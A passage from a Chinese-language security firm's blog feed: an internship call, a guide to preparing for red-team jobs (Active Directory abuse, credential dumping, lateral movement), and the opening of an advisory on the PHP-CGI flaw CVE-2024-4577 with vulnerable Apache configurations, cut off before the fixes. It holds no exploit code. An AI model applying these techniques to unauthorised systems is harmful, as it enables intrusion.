  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache、Tomcat、IIS）及作業系統（如：Linux、Windows）的能力&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day Exploit&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷內容&lt;/li&gt;
  &lt;li&gt;簡答題答案
    &lt;ul&gt;
      &lt;li&gt;應徵 Research 實習生：
        &lt;ul&gt;
          &lt;li&gt;題目一：漏洞重現與分析過程
            &lt;ul&gt;
              &lt;li&gt;請提出一個，你印象最深刻或感到有趣、於西元 2022 ~ 2024 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解詳述說明漏洞的成因、利用條件和可以造成的影響。同時，嘗試描述如何復現此漏洞或攻擊鏈，即使無法成功復現，也請記錄研究過程。報告撰寫請參考&lt;a href=&quot;/assets/files/recruit/binary/2024_6th_intern_analysis_example.pdf&quot;&gt;範本&lt;/a&gt;，盡可能詳細，中英不限。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;題目二：實習期間想要研究的主題
            &lt;ul&gt;
              &lt;li&gt;請提出三個可能選擇的明確主題，並簡單說明提出的理由或想完成的內容，例如：
                &lt;ul&gt;
                  &lt;li&gt;研究◯◯開源軟體，找到可 RCE 的重大風險弱點。&lt;/li&gt;
                  &lt;li&gt;研究常見的路由器，目標包括：AA-123 路由器、BB-456 無線路由器。&lt;/li&gt;
                  &lt;li&gt;研究常見的筆記平台或軟體，目標包括：XX Note、YY Note。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;應徵 Red Team 實習生：
        &lt;ul&gt;
          &lt;li&gt;請提出兩個於西元 2022 ~ 2024 年間公開的、與 Web 攻擊面、漏洞或攻擊鏈相關的演講。請說明為什麼挑選這些演講並解釋它們為什麼有趣。用你的話詳細解釋這些演講的細節，並提供任何你覺得可以輔助或證明你理解的附加資料。這些演講可以來自包含但不限於 Black Hat、DEF CON、OffensiveCon、POC、ZeroConf、Hexacon、HITCON、TROOPERS CONFERENCE 等會議。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本階段收件截止時間為 &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt;，我們會根據您的履歷及題目所回答的內容來決定是否有通過第一階段，我們會在 10 個&lt;strong&gt;工作天&lt;/strong&gt;內回覆。&lt;/p&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;

&lt;p&gt;此階段為 30~120 分鐘（依照組別需求而定，會另行通知）的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h4 id=&quot;時間軸&quot;&gt;時間軸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/07/18 - 2024/08/09 公開招募&lt;/li&gt;
  &lt;li&gt;2024/08/12 - 2024/08/22 面試&lt;/li&gt;
  &lt;li&gt;2024/08/26 前回應結果&lt;/li&gt;
  &lt;li&gt;2024/09/02 第六屆實習計畫於當週開始&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;題目答案&lt;/strong&gt;以 PDF 格式寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt; 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Red Team 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在三頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.16personalities.com/tw&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/18/6th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/07/18/6th-internship-program-recruit</guid>
                <pubDate>Thu, 18 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>紅隊演練專家應徵指南</title>
                <description>&lt;p&gt;紅隊演練是 DEVCORE 最核心的業務。我們擁有豐富的實戰經驗，並且集結了一群優秀的夥伴共同迎接挑戰。很多技術愛好者希望加入我們，想要了解我們錄取新人所看重的方向。趁著畢業季求職潮，我們特別準備了這份應徵指南，希望幫助有興趣的人了解準備方向，也希望幫助一些剛畢業、不擅長撰寫履歷、不擅長在面試中表達自己的人，補足必要技能以免錯失機會。無論您對紅隊演練專家或滲透測試工程師感興趣，期望可以循著這份指南，成為我們的夥伴。&lt;/p&gt;

&lt;p&gt;順帶一提，有一個在學生可能感興趣的資訊：DEVCORE 有研發替代役名額，唯名額有限，推薦您在學期間盡早投遞履歷並詢問替代役狀況。&lt;/p&gt;

&lt;h2 id=&quot;-devcore-應徵流程&quot;&gt;🚀 DEVCORE 應徵流程&lt;/h2&gt;

&lt;p&gt;應徵紅隊演練專家、滲透測試工程師都會經歷「書面審查」、「線上測驗」、「面試」三個階段。&lt;/p&gt;

&lt;h3 id=&quot;-書面審查&quot;&gt;📌 書面審查&lt;/h3&gt;

&lt;p&gt;履歷是這個階段主要評估依據，以下 4 點是我們認為應徵者需要注意的地方：&lt;/p&gt;

&lt;h4 id=&quot;履歷內容符合職務需求嗎&quot;&gt;履歷內容符合職務需求嗎&lt;/h4&gt;

&lt;p&gt;這個階段最重要的是說服審核者你具備職務需求的能力，所以請盡量在履歷內容附上能幫助別人判斷的佐證資訊。過去有些技術底不錯的同學只單純放了學歷，這樣要讓審核者想找個可以進入下一階段的理由都難，相當可惜。&lt;/p&gt;

&lt;h4 id=&quot;用一些實例說明吧&quot;&gt;用一些實例說明吧&lt;/h4&gt;

&lt;p&gt;實例證明是讓你的履歷脫穎而出的關鍵，具體的數字和事實可以大大增加履歷的說服力，例如能具體說出打過多少場滲透測試，在過程中找了多少漏洞，或在任務中解決了什麼樣的問題，達到什麼效果。這些不僅能表示技術能力，還能顯示你的影響力。&lt;/p&gt;

&lt;h4 id=&quot;提供有幫助的額外資訊&quot;&gt;提供有幫助的額外資訊&lt;/h4&gt;

&lt;p&gt;相關專業證照、參與技術社群、貢獻開源專案等額外資訊都有助於審核者評估。有些人好奇一些非技術等經驗應不應該放在履歷中，我們預設是不會特別參考，但如果你認為這些經驗對未來工作有正面影響，可附上讓審核者評估。&lt;/p&gt;

&lt;h4 id=&quot;特別希望列出的加分項&quot;&gt;特別希望列出的加分項&lt;/h4&gt;

&lt;p&gt;下面列出一些非必要但有會很不錯的加分項目，如果有這方面的經歷務必要寫上。同時也列出每個項目中我們看重的特質，如果有其他可以展現這些特質的經歷也歡迎列出來讓審核者知道。&lt;/p&gt;

&lt;h5 id=&quot;-實戰經驗如cvebug-bounty&quot;&gt;📄 實戰經驗如：CVE、bug bounty&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;代表您擁有解決未知問題能力。&lt;/li&gt;
  &lt;li&gt;代表您能看到別人所沒有關注到的細節。&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-writeups-或是-blog&quot;&gt;📄 CTF Writeups 或是 Blog&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;如果在 CTF 比賽有不錯的成績，通常意味著你擁有在短時間內分析歸納重點的能力、也能夠快速找到解決辦法，聯想力創造力可能也不差。&lt;/li&gt;
  &lt;li&gt;我們希望能了解您如何描述複雜的漏洞，因為在將來的工作中需要將漏洞過程清楚描述並給予建議。&lt;/li&gt;
  &lt;li&gt;寫 Blog 除了能展現表達和文字能力外，通常也具有持續學習的熱情和樂於分享的特質，符合 DEVCORE 核心價值觀。&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-出題經驗&quot;&gt;📄 CTF 出題經驗&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;代表平常會持續關注流行的技術、研究語言或框架特性，能注意到一些鮮少人知道的小細節。&lt;/li&gt;
  &lt;li&gt;說明你除了攻擊，還具備一定程度的開發能力。&lt;/li&gt;
  &lt;li&gt;為了怕題目被 CTF 玩家惡意破壞，通常出題者也具備高水準的防禦能力。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-線上測驗&quot;&gt;📌 線上測驗&lt;/h3&gt;

&lt;p&gt;這個階段的進行方式與一般線上靶機環境如 OSCP、HTB 無異，會分配到一個題組，平均需要解五把 flag。應徵者會有相當足夠的時間進行解題（預設 10 天，視題目會微調），最後交付報告。我們期待從線上測驗中看到應徵者具備下述能力：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;偵查：能否透過現有資訊合理推斷背後的架構或寫法。&lt;/li&gt;
  &lt;li&gt;漏洞挖掘：能否找到題目中設計的漏洞。&lt;/li&gt;
  &lt;li&gt;應變：碰到特殊的環境可否自行想辦法克服。例如在只有 command injection 且內網有防火牆限制的特殊環境下，怎麼用手邊可利用的資源達成你的目標。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-面試&quot;&gt;📌 面試&lt;/h3&gt;

&lt;p&gt;最後的面試階段會全面評估你是否適合這個職位，下述 2 件事情特別想與應徵者分享：&lt;/p&gt;

&lt;h4 id=&quot;被問倒是正常的&quot;&gt;被問倒是正常的&lt;/h4&gt;

&lt;p&gt;在面試過程中，面試官會從多個角度深入了解應徵者技術的廣度和深度，因此，會被問倒是正常的。請對自己的技術能力有信心，畢竟你已經通過了第二階段的線上測驗。被問到不熟悉的問題時，只要誠實地表達你的思考過程和解決問題的方法即可。我們想要知道思考脈絡，甚至期待你說：我看到 XX 特徵覺得這題可能是 OO 方向解，我會想用什麼關鍵字搜尋找答案。這樣的回答也凸顯了你的判斷力和解決問題的能力。&lt;/p&gt;

&lt;h4 id=&quot;分享你的-hack-故事&quot;&gt;分享你的 Hack 故事&lt;/h4&gt;

&lt;p&gt;我們期待在面試中聽你分享過去特別的 Hack 經歷，並且與你討論細節。Hack 的內容不限，例如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;履歷中提到的 CVE、bug bounty
    &lt;ul&gt;
      &lt;li&gt;希望是一些特別的情境，如果找到的是常見漏洞如 SQLi 或 XSS，那會希望了解這個漏洞特別在哪？或者是能說出你做了什麼，為什麼你能找到這個漏洞？&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;在 CTF 比賽中想到的精妙解法&lt;/li&gt;
  &lt;li&gt;生活中為了達成目標做的 Hack
    &lt;ul&gt;
      &lt;li&gt;例如：為了自動化工作流程寫了個小工具；為了租房資訊串了個方便通知系統；想把遊戲每日領取任務自動化。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;-自我鍛鍊之路&quot;&gt;🚀 自我鍛鍊之路&lt;/h2&gt;

&lt;p&gt;這一段寫給現在還在準備階段，未來很想要加入資安檢測行業的同學。為了增加自己的實力，在應徵前有下面幾個精進事項可參考，這對在資安領域長遠發展也很有幫助。&lt;/p&gt;

&lt;h3 id=&quot;-補足基礎知識&quot;&gt;📌 補足基礎知識&lt;/h3&gt;

&lt;h4 id=&quot;web-常見漏洞種類&quot;&gt;Web 常見漏洞種類&lt;/h4&gt;

&lt;p&gt;我們認為 &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 整理的漏洞經典且完整，加上有 LAB 可以直接練習，適合初學者。這些漏洞是從事資安檢測最基礎的溝通語言，推薦要把&lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;教材頁面&lt;/a&gt;上所有漏洞練習完，可以從&lt;a href=&quot;https://portswigger.net/web-security/all-topics&quot;&gt;主題頁面&lt;/a&gt;看分類會比較清楚。若以紅隊為目標，我們會優先關注能拿 shell 的後端漏洞。
以下提供幾點自我驗證與精進項目：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;抽一個漏洞是否可以說出這個漏洞常發生在什麼功能？背後的成因？通常可以怎麼進階利用這個漏洞？&lt;/li&gt;
  &lt;li&gt;有沒有辦法在黑箱狀態，透過測試辨識出這些漏洞？&lt;/li&gt;
  &lt;li&gt;在白箱狀態下，知道哪些漏洞要透過搜尋什麼函數找到？&lt;/li&gt;
  &lt;li&gt;我們在面試中喜歡問各種漏洞怎麼拿 shell 的問題，因為這就是紅隊演練目標的第一步。搜尋 “from XSS to RCE” 這類的關鍵字能找到相當多案例（XSS 可以取代成 SQLi 等漏洞）。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;紅隊戰術與技巧&quot;&gt;紅隊戰術與技巧&lt;/h4&gt;

&lt;p&gt;控制一台電腦後，仍需要在內網中擴散完成任務目標。&lt;a href=&quot;https://ired.team/&quot;&gt;ired.team&lt;/a&gt; 提供了一本紅隊技巧工具書，推薦閱讀以了解在不同階段有哪些招式可用。對 DEVCORE 而言，我們優先關注「Active Directory &amp;amp; Kerberos Abuse」、「Credential Access &amp;amp; Dumping」、「Lateral Movement」章節下的技能。此外，「Network pivoting &amp;amp; tunneling」的概念和技巧也是我們會關注的能力，ired.team 在這塊著墨較少，&lt;a href=&quot;https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/&quot;&gt;這篇文章&lt;/a&gt;涵蓋了必要知識和工具可參考。
以終為始學習，希望在練習這些技巧和工具後，能對下面的問題有自己的看法：&lt;/p&gt;

&lt;p&gt;如果打下企業一台外網服務，而你的目標是該企業內網網域控制器（情境架構可自行假設）：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;為了打 AD，你在打下的外網伺服器上會做哪些事情？為什麼？過程中你偏好使用什麼工具？偏好的原因是什麼？&lt;/li&gt;
  &lt;li&gt;同上，這台伺服器如果有網域帳號你之後會做哪些事情？如果沒有網域帳號呢？&lt;/li&gt;
  &lt;li&gt;想拿下網域控制器，心中能否馬上跳出五種以上的方法？你會優先嘗試什麼方法？為什麼？&lt;/li&gt;
  &lt;li&gt;過程中橫向移動偏好使用什麼工具？為什麼？&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-練習&quot;&gt;📌 練習&lt;/h3&gt;

&lt;h4 id=&quot;虛擬靶機練習&quot;&gt;虛擬靶機練習&lt;/h4&gt;

&lt;p&gt;除了知識外，也要找一些模擬環境培養手感。知名的 Hack The Box 和 OffSec 都有推出學習路徑和豐富的靶機：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://academy.hackthebox.com/catalogue/paths&quot;&gt;Hack The Box Cybersecurity Paths&lt;/a&gt; (優先練習：Penetration Tester, Senior Web Penetration Tester, Active Directory Enumeration)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/learning/paths/&quot;&gt;OffSec Learning Paths&lt;/a&gt; (Filter: Red Teamer, Web App Tester)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;選擇適合自己的平台練習即可。也可以單純打 &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HTB Labs&lt;/a&gt; 靶機，練到覺得每次解題目要做的事情都類似，開始覺得題目有套路感就可以了，一些特殊解法在現階段不需糾結。過去有玩 HTB 的實習生在錄取前附上的 Writeups 大概會寫 30~50 台靶機，這個數量級或許可以參考。另外若要練習打網域，最近 GitHub 上有一個 &lt;a href=&quot;https://github.com/Orange-Cyberdefense/GOAD&quot;&gt;GOAD LAB&lt;/a&gt; 專案滿值得參考。&lt;/p&gt;

&lt;p&gt;如果想考證照，我們有考過覺得對提昇檢測工作能力有幫助的有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/pen-200/&quot;&gt;OffSec PEN-200(OSCP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;提昇識別和利用漏洞能力&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/web-300/&quot;&gt;OffSec WEB-300(OSWE)&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;提昇白箱挖掘漏洞能力&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.alteredsecurity.com/adlab&quot;&gt;Certified Red Team Professional (CRTP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;提昇網域相關基本知識面與攻擊面&lt;/li&gt;
      &lt;li&gt;新手友善，是少數可以系統性學習網域攻擊的場域。內容較簡單且與 DEVCORE 慣用作法有落差，但入職後上手會較快。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;註：以上僅提供已知有幫助的證照，不代表其他證照沒有幫助&lt;/p&gt;

&lt;h4 id=&quot;實戰練習&quot;&gt;實戰練習&lt;/h4&gt;

&lt;p&gt;最推薦的還是到真實場域來看看。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;白箱練習&lt;/strong&gt;：可以嘗試找你熟悉或喜歡的 GitHub 專案，先看這個專案過去的漏洞，試試看如果自己白箱看有沒有辦法能追到。如果這些有正解的漏洞都能順利找到，接著就開始找一些 Open Source 專案來挖掘 0-day 吧。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;黑箱練習&lt;/strong&gt;：參與 bug bounty 計畫，挑戰真實世界的安全問題。台灣企業的計畫可以參考 &lt;a href=&quot;https://zeroday.hitcon.org/bug-bounty/list&quot;&gt;HITCON ZeroDay&lt;/a&gt; ，國外則推薦 &lt;a href=&quot;https://hackerone.com/opportunities/all&quot;&gt;HackerOne&lt;/a&gt; 上面的目標。這些計畫會讓你面對更複雜和多樣的攻擊場景，提升你的實戰能力。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-找同伴一起&quot;&gt;📌 找同伴一起&lt;/h3&gt;

&lt;p&gt;在資安這條路上，找到志同道合的夥伴一起學習、一起打 CTF、一起挖漏洞絕對比獨自升級來的有效率，下列活動可考慮參加：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2024/CMT/&quot;&gt;HITCON Community&lt;/a&gt;: 幾乎所有資安社群都會聚集在這個研討會，可以在研討會中找一個適合自己的社群參與。&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ais3.org/&quot;&gt;AIS3&lt;/a&gt;: 聚集台灣幾乎所有對資安有興趣的在學生。滿有機會在這邊認識志同道合的朋友。&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://forms.gle/3HHuBVzjHCwfAnGc8&quot;&gt;台灣好厲駭 Deep Hacking 讀書會&lt;/a&gt;: 全台灣探討資安最深最扎實的讀書會之一，參加絕對可以提昇視野、也能認識各種高手。內容偏 Binary 但目前漸漸在轉型中，希望不分類以挖掘漏洞為主。&lt;/li&gt;
  &lt;li&gt;DEVCORE 實習生計畫： 每年一月中和七月中會招生，如果目的是應徵 DEVCORE，參加計畫問導師應該是最快的。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果你想知道更多資源，&lt;a href=&quot;https://github.com/Ice1187/TW-Security-and-CTF-Resource&quot;&gt;台灣資安 / CTF 學習資源整理&lt;/a&gt; 整理的資源值得參考。&lt;/p&gt;

&lt;h2 id=&quot;-小結&quot;&gt;🚀 小結&lt;/h2&gt;

&lt;p&gt;本篇指南分成兩部分：前半部主要在給應徵者一些小提醒，希望應徵者能把最好的一面呈現出來。後半部提供一個學習的脈絡，希望給還在學習階段的人一個比較清楚的方向。&lt;/p&gt;

&lt;p&gt;最終，我們都希望台灣有越來越多熱愛技術的人進入資安產業。希望，未來能持續在資安領域看見正在閱讀的你。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/</link>
                <guid>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist</guid>
                <pubDate>Tue, 09 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>資安通報：PHP 遠端程式碼執行 (CVE-2024-4577) - PHP CGI 參數注入弱點</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;戴夫寇爾研究團隊在進行&lt;a href=&quot;https://devco.re/research/overview/&quot;&gt;前瞻攻擊研究&lt;/a&gt;期間，發現 PHP 程式語言存在遠端程式碼執行弱點，基於 PHP 在網站生態使用的廣泛性以及此弱點之易重現性，研究團隊將此弱點標記為嚴重、並在第一時間回報給 PHP 官方。官方已在 2024/06/06 發佈修復版本，詳細時程可參閱&lt;a href=&quot;#漏洞回報時間軸&quot;&gt;漏洞回報時間軸&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;漏洞描述&quot;&gt;漏洞描述&lt;/h2&gt;

&lt;p&gt;PHP 程式語言在設計時忽略 Windows 作業系統內部對字元編碼轉換的 &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; 特性，導致未認證的攻擊者可透過特定的字元序列繞過舊有 &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; 的保護；透過參數注入等攻擊在遠端 PHP 伺服器上執行任意程式碼。&lt;/p&gt;

&lt;h2 id=&quot;影響範圍&quot;&gt;影響範圍&lt;/h2&gt;

&lt;p&gt;此弱點&lt;strong&gt;影響安裝於 Windows 作業系統上所有的 PHP 版本&lt;/strong&gt;，詳情可參照下表:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於 PHP 8.0 分支、PHP 7 以及 PHP 5 官方已&lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;不再維護&lt;/a&gt;，網站管理員可參考&lt;a href=&quot;#如何確認自己易遭受攻擊&quot;&gt;如何確認自己易遭受攻擊&lt;/a&gt;章節，並於&lt;a href=&quot;#修補建議&quot;&gt;修補建議&lt;/a&gt;找到暫時緩解措施。&lt;/p&gt;

&lt;h2 id=&quot;如何確認自己易遭受攻擊&quot;&gt;如何確認自己易遭受攻擊?&lt;/h2&gt;

&lt;p&gt;對於常見之 Apache HTTP Server 加上 PHP 組合，網站管理員可透過此文章列出之兩個方式確認伺服器是否易被攻擊。其中，情境二也是 &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt; 安裝時的預設設定，因此&lt;strong&gt;所有版本的 XAMPP for Windows 安裝也預設受此弱點影響。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在本文撰寫當下已驗證當 Windows 作業系統執行於下列語系時，&lt;strong&gt;未授權的攻擊者可直接在遠端伺服器上執行任意程式碼&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;繁體中文 (字碼頁 950)&lt;/li&gt;
  &lt;li&gt;簡體中文 (字碼頁 936)&lt;/li&gt;
  &lt;li&gt;日文 (字碼頁 932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;對於其它執行在英文、韓文、西歐語系之 Windows 作業系統，由於 PHP 使用情境廣泛、暫無法完全列舉並排除其利用情境，因此還是建議使用者全面盤點資產、確認使用情境並更新 PHP 至最新版本確保萬無一失！&lt;/p&gt;

&lt;h3 id=&quot;情境一-將-php-設定於-cgi-模式下執行&quot;&gt;情境一: 將 PHP 設定於 CGI 模式下執行&lt;/h3&gt;

&lt;p&gt;在 Apache Httpd 設定檔中透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; 語法將對應的 HTTP 請求交給 PHP-CGI 執行檔處理時，受此弱點影響，常見設定包含但不限於:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;或&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;情境二-將-php-執行檔暴露在外-xampp-預設安裝設定&quot;&gt;情境二: 將 PHP 執行檔暴露在外 (XAMPP 預設安裝設定)&lt;/h3&gt;

&lt;p&gt;即使未設定 PHP 於 CGI 模式下執行，僅將 PHP 執行檔暴露在 CGI 目錄下也受此弱點影響，常見情況包含但不限於:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; 複製到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; 目錄中&lt;/li&gt;
  &lt;li&gt;將 PHP 安裝目錄透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; 暴露到外，如:
    &lt;pre&gt;&lt;code class=&quot;language-apache2=&quot;&gt; ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;修補建議&quot;&gt;修補建議&lt;/h2&gt;

